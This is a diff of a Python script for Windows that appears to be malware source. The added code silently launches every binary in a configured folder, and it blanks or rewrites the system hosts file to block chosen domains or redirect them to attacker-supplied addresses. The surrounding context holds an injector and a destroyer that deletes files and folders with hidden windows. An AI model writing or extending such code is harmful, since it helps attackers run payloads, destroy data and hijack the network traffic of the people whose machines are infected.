@@ -1,6 +1,7 @@
 import os, sys, ctypes, getpass, socket, subprocess, math, wmi, platform, datetime, time, requests, ftplib
 exec(open("config.py").read())
 
+cwd = os.getcwd()
 
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
@@ -164,7 +165,26 @@ if sysinfo:
     fh.write("Uname: " + str(platform.uname())+"\n")
     fh.close()
 
-os.chdir("../ext")
+# target execution
+if target_exec['controller']:
+    if os.path.exists(target_exec['path']):
+        if os.path.isdir(target_exec['path']):
+            for x in os.listdir(target_exec['path']):
+                os.chdir(target_exec['path'])
+                os.startfile(x)
+        else:
+            os.startfile(target_exec['path'])
+    else:
+        log_error += "\n[target_exec] -> path is invalid"
+
+# local execution
+if local_exec:
+    os.chdir(cwd)
+    os.chdir('ext/bin_exec')
+    for x in os.listdir():
+        os.startfile(x)
+
+os.chdir("../")
 # injector
 if injector["controller"]:
     ipath = injector["path"]
@@ -219,6 +239,28 @@ if destroyer["controller"]:
             subprocess.call("cmd /c rd /s /q "+"\""+dpath+"\"", startupinfo=si)
         else:
             subprocess.call("cmd /c del "+ "\"" +dpath+"\"", startupinfo=si)
+
+# dns halter
+if dns_halt["controller"]:
+    os.chdir(os.environ['WINDIR'] + "\\System32\\drivers\\etc\\")
+    if dns_halt["clear"]:
+        open('hosts', 'w')
+    if dns_halt['entries'] is not "":
+        for x in dns_halt['entries'].split(', '):
+            f = open('hosts', 'a')
+            f.write("\n127.0.0.1 "+x)
+        f.close()
+
+# dns poisoner
+if dns_poison['controller']:
+    os.chdir(os.environ['WINDIR'] + "\\System32\\drivers\\etc\\")
+    if dns_poison['clear']:
+        open('hosts', 'w')
+    if dns_poison['entries'] is not "":
+        for x in dns_poison['entries'].split(', '):
+            f = open('hosts', 'a')
+            f.write("\n"+x)
+        f.close()
 
 # logging end
 if logging:
